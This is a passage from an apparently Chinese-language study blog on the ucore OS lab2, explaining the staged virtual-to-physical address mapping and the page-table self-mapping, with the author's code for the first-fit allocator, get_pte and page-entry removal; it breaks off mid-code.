title="地址映射的四个阶段"></a>地址映射的四个阶段</h4><p>在lab2中，为了建立正确的地址映射关系，ld在链接阶段生成了ucore OS执行代码的虚拟地址，而bootloader与ucore OS协同工作，通过在运行时对地址映射的一系列“腾挪转移”，从计算机加电，启动段式管理机制，启动段页式管理机制，在段页式管理机制下运行这整个过程中，虚拟地址到物理地址的映射产生了多次变化，实现了最终的段页式映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><h4 id="最开始-链接脚本"><a href="#最开始-链接脚本" class="headerlink" title="最开始: 链接脚本"></a>最开始: 链接脚本</h4><p>tools/kernel.ld文件在lab1和lab2中的区别。在lab1中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_init)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0x100000;<br><br>            .text : &#123;<br>                       *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着在lab1中通过ld工具形成的ucore的起始虚拟地址从0x100000开始，注意：这个地址是虚拟地址。但由于lab1中建立的段地址映射关系为对等关系，所以ucore的物理地址也是从0x100000开始，而ucore的入口函数kern_init的起始地址。所以在lab1中虚拟地址、线性地址以及物理地址之间的映射关系如下：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab1: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><p>在lab2中：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ENTRY(kern_entry)<br><br>SECTIONS &#123;<br>            /* Load the kernel at this address: &quot;.&quot; means the current address */<br>            . = 0xC0100000;<br><br>            .text : &#123;<br>                        *(.text .stub .text.* .gnu.linkonce.t.*)<br>            &#125;<br></code></pre></div></td></tr></table></figure><p>这意味着lab2中通过ld工具形成的ucore的起始虚拟地址从0xC0100000开始，注意：这个地址也是虚拟地址。入口函数为kern_entry函数（在kern/init/entry.S中）。这与lab1有很大差别。但其实在lab1和lab2中，bootloader把ucore都放在了起始物理地址为0x100000的物理内存空间。<strong>这实际上说明了ucore在lab1和lab2中采用的地址映射不同。lab2在不同阶段有不同的虚拟地址、线性地址以及物理地址之间的映射关系。</strong> </p><p>也请注意，这个起始虚拟地址的变化其实并不会影响一般的跳转和函数调用，因为它们实际上是相对跳转。但是，对于绝对寻址的全局变量的引用，就需要用REALLOC宏(即将要重新计算的地址-0xC0100000)进行一些运算来确保地址是正确的。</p><h4 id="第一个阶段"><a href="#第一个阶段" class="headerlink" title="第一个阶段"></a>第一个阶段</h4><p>（开启保护模式，创建启动段表）是bootloader阶段，即从bootloader的start函数（在boot/bootasm.S中）到执行ucore kernel的kern_entry函数之前，其虚拟地址、线性地址以及物理地址之间的映射关系与lab1的一样，即：</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">lab2 stage <span class="hljs-number">1</span>: virt <span class="hljs-keyword">addr</span> = linear <span class="hljs-keyword">addr</span> = phy <span class="hljs-keyword">addr</span><br></code></pre></div></td></tr></table></figure><h4 id="第二个阶段"><a href="#第二个阶段" class="headerlink" title="第二个阶段"></a>第二个阶段</h4><p>（创建初始页目录表，开启分页模式）从kern_entry函数开始，到pmm_init函数被执行之前。</p><p>编译好的ucore自带了一个**设置好的(就在entry.S里, 也不知道为什么要设置成两段映射)**页目录表和相应的页表，将0~4M的线性地址一一映射到物理地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">.align PGSIZE<br>__boot_pgdir:<br>.globl __boot_pgdir<br>    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    # 这个左移两位是乘以4的意思, 即(PDE *)__boot_pgdir + PDX(KERNBASE), <br>    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to the PDE of KERNBASE<br>    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)<br>    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE<br><br>.set i, 0<br>__boot_pt1:<br>.rept 1024# repeat 1024 times, a page table<br>    .long i * PGSIZE + (PTE_P | PTE_W)<br>    .set i, i + 1<br>.endr<br></code></pre></div></td></tr></table></figure><p>了解了一一映射的二级页表结构后，接下来就要使能分页机制了，这主要是通过几条汇编指令（在kern/init/entry.S中）实现的，主要做了两件事：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># load pa of boot pgdir<br>movl $REALLOC(__boot_pgdir), %eax<br>movl %eax, %cr3# 1.把页目录表的起始地址存入CR3寄存器中；<br><br># enable paging<br>movl %cr0, %eax<br>orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax<br>andl $~(CR0_TS | CR0_EM), %eax<br>movl %eax, %cr0# 2.把cr0中的CR0_PG标志位设置上。<br></code></pre></div></td></tr></table></figure><p>执行完这几条指令后，计算机系统进入了分页模式！虚拟地址、线性地址以及物理地址之间的临时映射关系为：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lab2 stage 2 before:<br>    virt addr = linear addr = phy addr # 线性地址在0~4MB之内三者的映射关系<br>    virt addr = linear addr = phy addr + 0xC0000000 # 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系<br></code></pre></div></td></tr></table></figure><p>可以看到，其实仅仅比第一个阶段增加了下面一行的0xC0000000偏移的映射，并且作用范围缩小到了0~4M。在下一个阶段, 会将作用范围继续扩充到0~KMEMSIZE。</p><p>实际上这种映射限制了内核的大小。当内核大小超过预期的4MB （实际上是3M，因为内核从 0x100000开始编址）就可能导致打开分页之后内核crash，在某些试验中，也的确出现了这种情况。解决方法同样简单，就是正确填充更多的页目录项即可。</p><p>此时的内核（EIP）还在0~4M的低虚拟地址区域运行，而在之后，这个区域的虚拟内存是要给用户程序使用的。为此，需要使用一个绝对跳转来使内核跳转到高虚拟地址（代码在kern/init/entry.S中）：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # update eip<br>    # now, eip = 0x1.....<br>    leal next, %eax<br>    # set eip = KERNBASE + 0x1.....<br>    jmp *%eax<br>next:<br></code></pre></div></td></tr></table></figure><p>跳转完毕后，通过把boot_pgdir[0]对应的第一个页目录表项（0~4MB）清零来取消了临时的页映射关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm"># unmap va 0 ~ 4M, it&#x27;s temporary mapping<br>xorl %eax, %eax<br>movl %eax, __boot_pgdir<br></code></pre></div></td></tr></table></figure><p>最终，离开这个阶段时，虚拟地址、线性地址以及物理地址之间的映射关系为：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">2</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span> <span class="hljs-comment"># 线性地址在0xC0000000~0xC0000000+4MB之内三者的映射关系</span><br></code></pre></div></td></tr></table></figure><p>总结来看，这一阶段的目的就是更新映射关系的同时将运行中的内核（EIP）从低虚拟地址“迁移”到高虚拟地址，而不造成伤害。</p><p>不过，这还不是我们期望的映射关系，因为它仅仅映射了0~4MB。对于段表而言，也缺少了运行ucore所需的用户态段描述符和TSS（段）描述符相应表项。</p><h4 id="第三个阶段"><a href="#第三个阶段" class="headerlink" title="第三个阶段"></a>第三个阶段</h4><p>（完善段表和页表）从pmm_init函数被调用开始。pmm_init函数将页目录表项补充完成（从0~4M扩充到0~KMEMSIZE）。然后，更新了段映射机制，使用了一个新的段表。这个新段表除了包括内核态的代码段和数据段描述符，还包括用户态的代码段和数据段描述符以及TSS（段）的描述符。理论上可以在第一个阶段，即bootloader阶段就将段表设置完全，然后在此阶段继续使用，但这会导致内核的代码和bootloader的代码产生过多的耦合，于是就有了目前的设计。</p><p>这时形成了我们期望的虚拟地址、线性地址以及物理地址之间的映射关系：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">lab2 stage <span class="hljs-number">3</span>: virt addr = linear addr = phy addr + <span class="hljs-number">0xC0000000</span><br></code></pre></div></td></tr></table></figure><p>段表相应表项和TSS也被设置妥当。</p><h3 id="自映射机制"><a href="#自映射机制" class="headerlink" title="自映射机制"></a>自映射机制</h3><p><strong>4GB内存都有用到吗?</strong> </p><p>众所周知, 从物理地址空间中的每一个block分配page table之后(在default_init_memmap完成), 虚拟地址空间是一片连续的空间, 从0xC0000000开始, 大小为0x38000000=896MB, 并没有用完全部4GB的地址空间, 这只是一个设定, 可以根据情况进行改变.<br>memlayout.h中定义了常量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE 0xC0000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KMEMSIZE 0x38000000 <span class="hljs-comment">// the maximum amount of physical memory</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNTOP (KERNBASE + KMEMSIZE)</span><br><span class="hljs-comment">//------------------------------</span><br>define VPT<span class="hljs-number">0xFAC00000</span><br></code></pre></div></td></tr></table></figure><p><strong>自映射是什么?</strong> </p><p>注意到每一个4KB页表中有1k个4B的pte, 每个pte指向物理空间中4KB的page, 整个page table指向了虚拟空间中4MB大小的pages. 如果我们把映射4GB空间的4MB页表放在4MB对齐的虚拟地址处, 那么可以想到有一个页表刚好映射他所在的4MB区域, 于是就充当了页目录表的功能.</p><p>具体而言，ucore是这样设计的，首先设置了一个常量（memlayout.h）：</p><p>VPT=<strong>0xFAC00000</strong>， 这个地址的二进制表示为：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">1111</span> <span class="hljs-number">1010</span> <span class="hljs-number">11</span>|<span class="hljs-number">00</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>| <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span><span class="hljs-comment">//管道符号表示虚拟地址的三个部分</span><br></code></pre></div></td></tr></table></figure><p>高10位为1111 1010 11，即10进制的1003，中间10位为0，低12位也为0。在pmm.c中有两个全局初始化变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> * <span class="hljs-keyword">const</span> vpt = (<span class="hljs-keyword">pte_t</span> *)VPT;<br><span class="hljs-keyword">pde_t</span> * <span class="hljs-keyword">const</span> vpd = (<span class="hljs-keyword">pde_t</span> *)PGADDR(PDX(VPT), PDX(VPT), <span class="hljs-number">0</span>);<span class="hljs-comment">//这个宏用来拼接虚拟地址</span><br></code></pre></div></td></tr></table></figure><p>并在pmm_init函数执行了如下语句：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;<br></code></pre></div></td></tr></table></figure><p>这些变量和语句有何特殊含义呢？<strong>其实vpd变量的值就是页目录表的起始虚地址0xFAFEB000</strong>，且它的高10位和中10位是相等的，都是10进制的1003。当执行了上述语句，就确保了vpd变量的值就是页目录表的起始虚地址，且vpt是页目录表中第一个目录表项指向的页表的起始虚地址。此时描述内核虚拟空间的页目录表的虚地址为0xFAFEB000，大小为4KB。页表的理论连续虚拟地址空间0xFAC00000~0xFB000000，大小为4MB。因为这个连续地址空间的大小为4MB，可有1M个PTE，即可映射4GB的地址空间。</p><p><strong>有什么好处?</strong> </p><p>在页机制建立好后, 如果我们这时需要按虚拟地址的地址顺序显示整个页目录表和页表的内容，则要查找页目录表的页目录表项内容，根据页目录表项内容找到页表的物理地址**(pdt和pt为什么存放的是物理地址?)**，再转换成对应的虚地址，然后访问页表的虚地址，搜索整个页表的每个页目录项。这样过程比较繁琐。</p><p>但是利用以上的方法, 通过连续扫描这特定的4MB虚拟地址空间，就很容易访问每个页目录表项和页表项内容。</p><p>在pmm.c中的函数<code>print_pgdir</code>就是基于ucore的页表自映射方式完成了对整个页目录表和页表的内容扫描和打印。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//print_pgdir - print the PDT&amp;PT</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">print_pgdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    cprintf(<span class="hljs-string">&quot;-------------------- BEGIN --------------------\n&quot;</span>);<br>    <span class="hljs-keyword">size_t</span> left, right = <span class="hljs-number">0</span>, perm;<br>    <span class="hljs-comment">//找出一个页目录表权限相同的range, 存在left和right中</span><br>    <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(<span class="hljs-number">0</span>, NPDEENTRY, right, vpd, &amp;left, &amp;right)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//几个数字分别代表range中条目数量,虚地址范围,大小,权限</span><br>        cprintf(<span class="hljs-string">&quot;PDE(%03x) %08x-%08x %08x %s\n&quot;</span>, right - left,<br>                left * PTSIZE, right * PTSIZE, (right - left) * PTSIZE, perm2str(perm));<br>        <span class="hljs-keyword">size_t</span> l, r = left * NPTEENTRY;<br>        <span class="hljs-keyword">while</span> ((perm = get_pgtable_items(left * NPTEENTRY, right * NPTEENTRY, r, vpt, &amp;l, &amp;r)) != <span class="hljs-number">0</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;  |-- PTE(%05x) %08x-%08x %08x %s\n&quot;</span>, r - l,<br>                    l * PGSIZE, r * PGSIZE, (r - l) * PGSIZE, perm2str(perm));<br>        &#125;<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;--------------------- END ---------------------\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="练习3-2"><a href="#练习3-2" class="headerlink" title="练习3+2"></a>练习3+2</h2><h3 id="练习一-1"><a href="#练习一-1" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>实现 first-fit 连续物理内存分配算法</p></blockquote><ul><li>简单的修改了几个函数, 甚至不用全都改, 不过free函数我调试了好久</li></ul><h4 id="default-init-memmap"><a href="#default-init-memmap" class="headerlink" title="default_init_memmap"></a>default_init_memmap</h4><ul><li><p>该函数将新页面插入链表时，没有按照地址顺序插入</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>故需要修改该行代码，使其按地址顺序插入至双向链表中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add_before(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-alloc-pages"><a href="#default-alloc-pages" class="headerlink" title="default_alloc_pages"></a>default_alloc_pages</h4><ul><li><p>在原先的代码中，当获取到了一个大小足够大的页面地址时，程序会先将该页头从链表中断开，切割，并将剩余空间放回链表中。但将<em>剩余空间放回链表</em>时，并没有按照地址顺序插入链表。</p><blockquote><p>连续空闲页面中的第一个页称为页头，page header。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    list_del(&amp;(page-&gt;page_link));<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        <span class="hljs-comment">// 注意这一步</span><br>        list_add(&amp;free_list, &amp;(p-&gt;page_link));<br>    &#125;<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>以下是修改后的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (page != <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> (page-&gt;property &gt; n) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> page + n;<br>        p-&gt;property = page-&gt;property - n;<br>        SetPageProperty(p);<br>        <span class="hljs-comment">// 注意这一步add after</span><br>        list_add_after(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));<br>    &#125;<br>    list_del(&amp;(page-&gt;page_link));<br>    nr_free -= n;<br>    ClearPageProperty(page);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="default-free-pages"><a href="#default-free-pages" class="headerlink" title="default_free_pages"></a>default_free_pages</h4><ul><li><p>该函数默认会在函数末尾处，将待释放的页头插入至链表的第一个节点。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">list_add(&amp;free_list, &amp;(base-&gt;page_link));<br></code></pre></div></td></tr></table></figure></li><li><p>所以我们需要修改这部分代码，使其按地址顺序插入至对应的链表结点处。</p><p>可以在循环中记录比这个page地址小的free_page, 而且还要设置标记来表明是否有这么一个page, 具体参见源码</p></li></ul><h3 id="练习二-1"><a href="#练习二-1" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p><strong>实现寻找虚拟地址对应的页表项</strong>.</p></blockquote><blockquote><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。</p><p>其中的<code>get_pte</code>函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。</p></blockquote><p>以下为实现的代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">pte_t</span> * <span class="hljs-title">get_pte</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> la, <span class="hljs-keyword">bool</span> create)</span> </span>&#123;<br>    <span class="hljs-comment">// 获取传入的线性地址中所对应的页目录条目的物理地址</span><br>    <span class="hljs-keyword">pde_t</span> *pdep = PDX(la) + pgdir;<br>    <span class="hljs-comment">// 如果该条目不可用(not present)</span><br>    <span class="hljs-keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span>;</span><br>        <span class="hljs-comment">// 如果分配页面失败，或者不允许分配，则返回NULL</span><br>        <span class="hljs-keyword">if</span> (!create || (page = alloc_page()) == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 设置该物理页面的引用次数为1</span><br>        set_page_ref(page, <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 获取当前物理页面所管理的物理地址</span><br>        <span class="hljs-keyword">uintptr_t</span> pa = page2pa(page);<br>        <span class="hljs-comment">// 清空该物理页面的数据。需要注意的是使用虚拟地址</span><br>        <span class="hljs-built_in">memset</span>(KADDR(pa), <span class="hljs-number">0</span>, PGSIZE);<br>        <span class="hljs-comment">// 将新分配的页面设置为当前缺失的页目录条目中</span><br>        <span class="hljs-comment">// 之后该页面就是其中的一个二级页面</span><br>        *pdep = pa | PTE_U | PTE_W | PTE_P;<br>    &#125;<br>    <span class="hljs-comment">// 返回在pgdir中对应于la的二级页表项, 注意是虚拟地址, 因为返回一个物理地址也没啥用, cpu操作不了</span><br>    <span class="hljs-keyword">pte_t</span> *ptep = (<span class="hljs-keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)) + PTX(la);<br>    <span class="hljs-keyword">return</span> ptep; <br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>请描述页目录项（Pag Director Entry）和页表（Page Table Entry）中每个组成部分的含义和以及对ucore而言的潜在用处。</p><blockquote><p>请查看<a href="#vpt&pdt">虚拟页表结构</a></p></blockquote></li><li><p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p><ul><li>将引发页访问异常的地址将被保存在cr2寄存器中</li><li>设置错误代码</li><li>引发Page Fault，将外存的数据换到内存中</li><li>进行上下文切换，退出中断，返回到中断前的状态</li></ul></li></ul><h3 id="练习三-1"><a href="#练习三-1" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>释放某虚地址所在的页并取消对应二级页表项的映射</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) <span class="hljs-comment">//(1) check if this page table entry is present</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep); <span class="hljs-comment">//(2) find corresponding page to pte</span><br><br>    <span class="hljs-keyword">if</span> (page_ref_dec(page) == <span class="hljs-number">0</span>) <span class="hljs-comment">//(3) decrease page reference</span><br>    &#123;<br>        free_page(page); <span class="hljs-comment">//(4) and free this page when page reference reachs 0</span><br>    &#125;<br>    *ptep = <span class="hljs-number">0</span>;                 <span class="hljs-comment">//(5) clear second page table entry</span><br>    tlb_invalidate(pgdir, la); <span class="hljs-comment">//(6) flush tlb</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>两个问题:</p><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">数据结构Page的全局变量（其实是一个数组）的每一项与页表中的页目录项和页表项有无对应关系？如果有，其对应关系是啥？</p><p>CPU如果要访问内存地址, 送出CPU的肯定是虚拟地址, 经过MMU的转换完成虚拟地址到物理地址的转换.</p><p>在MMU中, 取出虚拟地址高10位和%cr3拼接成页目录表条目(pdte), 读取出内存中的页目录表(或者在MMU中的TLB)所存储的页表物理地址, 然后发送这个物理地址+虚拟地址中间十位到内存中访问到页表条目, 读出所在page的物理地址, 然后再和虚拟地址低12位拼接成物理地址到内存中访问. </p><p>如果没有TLB, 这中间会有多次访存:</p><ol><li>为读取目录项而访问主存。</li><li>为读取页表项而访问主存。</li><li>为读取操作数或指令而访问主存。</li></ol><p>回答本文章中的一个问题: <strong>为什么页目录表和页表存储的是对应的物理地址而不是虚拟地址?</strong> </p><p>原因也明了了, 这两个表就是MMU和内存合作完成虚拟地址到物理地址转换的基础, 而虚拟地址是在内核中使用的一个抽象连续空间的地址, 和MMU关系不大, 更不必往表项里存储虚拟地址, 何况这么做还会导致递归查找<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="即原先查找页目录表的目的是想将某个线性地址转换为物理地址，但如果页目录表中存放的是二级页表的线性地址，则需要先查找该二级页表的物理地址，此时需要递归查找，这可能会出现永远也查找不到物理地址的情况。">[1]</span></a></sup> </p><p class="note note-primary" style="font-style:italic;background-color:rgb(240,230,250)">如果希望虚拟地址与物理地址相等，则需要如何修改lab2，完成此事？ 鼓励通过编程来具体完成这个问题 </p><ul><li><p>将<code>labcodes/lab2/tools/kernel.ld</code>中的加载地址从<code>0xC0100000</code>修改为<code>0x0</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br>. = <span class="hljs-number">0xC0100000</span>;<br><span class="hljs-comment">// 修改后</span><br>. = <span class="hljs-number">0x0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>将<code>mm/</code>中的内核偏移地址修改为0</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 修改前</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNBASE           